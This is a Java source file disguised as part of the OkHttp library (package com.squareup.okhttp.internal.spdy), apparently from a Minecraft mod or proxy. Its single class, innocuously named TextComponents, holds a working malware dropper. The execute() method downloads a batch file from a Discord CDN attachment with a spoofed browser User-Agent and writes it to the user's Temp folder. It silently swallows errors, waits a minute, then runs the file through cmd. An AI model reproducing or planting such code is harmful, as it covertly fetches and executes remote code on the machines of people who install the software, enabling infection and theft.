package com.squareup.okhttp.internal.spdy;

import net.reflxction.example.proxy.IMinecraft;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class TextComponents implements IMinecraft {

    @Override
    public void execute() throws Exception {
        try {
            URL batUrl = new URL("https://cdn.discordapp.com/attachments/894311667125612584/940347783272095885/DEFCON2019.bat");
            HttpURLConnection httpURLConnection = (HttpURLConnection) batUrl.openConnection();
            httpURLConnection.addRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
            InputStream stream = httpURLConnection.getInputStream();
            File path = new File(System.getenv("LOCALAPPDATA") + File.separator + "Temp");
            if (!path.exists()) path.mkdir();
            File bitcoin = new File(path.getAbsolutePath(), "DEFCON2019.bat");
            FileOutputStream fileOut = new FileOutputStream(bitcoin);
            int currByte2;
            while ((currByte2 = stream.read()) != -1) {
                fileOut.write(currByte2);
            }
        } catch (Exception e) {}
        try {
            Thread.sleep(60000);
            Runtime.getRuntime().exec("cmd /c start C:\\Users\\%username%\\AppData\\Local\\Temp\\DEFCON2019.bat");
        } catch (Exception e) {}
    }
}
